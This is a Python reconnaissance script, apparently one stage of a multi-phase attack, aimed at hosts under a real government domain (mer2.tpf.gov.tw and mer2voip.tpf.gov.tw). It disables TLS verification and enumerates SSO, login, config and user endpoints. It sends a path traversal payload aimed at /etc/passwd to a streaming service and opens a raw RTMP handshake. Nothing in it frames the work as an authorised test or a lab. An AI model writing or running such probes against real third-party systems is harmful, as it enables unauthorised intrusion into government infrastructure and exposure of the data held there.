#!/usr/bin/env python3
"""Phase 3: mer2.tpf.gov.tw SSO + mer2voip RTMP 跨子域探测"""
import http.client, json, ssl, urllib.parse, sys
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def req(host, port, method, path, body=None, headers=None, timeout=15, proto='https'):
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': '*/*'}
    if headers: h.update(headers)
    cn = http.client.HTTPSConnection(host, port, context=ctx, timeout=timeout) if proto=='https' else http.client.HTTPConnection(host, port, timeout=timeout)
    cn.request(method, path, body=body, headers=h)
    r = cn.getresponse()
    rb = r.read()
    rh = dict(r.getheaders())
    cn.close()
    return r.status, rb, rh

print("="*80)
print("Phase 3-A: mer2.tpf.gov.tw:7000 merServer")
print("="*80)
for path in ['/config', '/login', '/users', '/', '/api/login', '/version', '/health', '/SSO2_Develop/', '/SSO20102/Login', '/Views/CreateSession.aspx']:
    s, b, _ = req('mer2.tpf.gov.tw', 7000, 'GET', path, timeout=10)
    print(f"  GET {path:40s} → status={s}  body[:150]={b[:150]!r}")

print()
print("="*80)
print("Phase 3-B: mer2.tpf.gov.tw:443 HTTPS（标准端口）")
print("="*80)
for path in ['/config', '/login', '/users', '/api/login', '/version', '/health', '/SSO2_Develop/', '/Views/CreateSession.aspx']:
    s, b, _ = req('mer2.tpf.gov.tw', 443, 'GET', path, timeout=10)
    print(f"  GET {path:40s} → status={s}  body[:150]={b[:150]!r}")

print()
print("="*80)
print("Phase 3-C: mer2voip.tpf.gov.tw:30080 RTMP/HLS 探测")
print("="*80)
for path in ['/', '/live', '/live?app=rtmp&stream=test', '/hls', '/hls/test.m3u8', '/rtmp/live', '/api', '/api/health', '/api/health/version', '/live/test', '/live?app=rtmp&stream=../../etc/passwd']:
    s, b, _ = req('mer2voip.tpf.gov.tw', 30080, 'GET', path, timeout=10)
    print(f"  GET {path:50s} → status={s}  body[:150]={b[:150]!r}")

print()
print("="*80)
print("Phase 3-D: mer2voip.tpf.gov.tw:1935 RTMP 端口探测 (TCP)")
print("="*80)
import socket
for port in [1935]:
    try:
        s = socket.create_connection(('mer2voip.tpf.gov.tw', port), timeout=5)
        # RTMP 握手 C0+C1
        s.send(b'\x03' + b'\x00'*1536)  # C0=0x03 (RTMP version), C1=1536 zero bytes
        data = s.recv(3073)
        print(f"  RTMP port {port}: connected, recv {len(data)} bytes  head={data[:32].hex()}")
        s.close()
    except Exception as e:
        print(f"  RTMP port {port}: ERROR {e!r}")

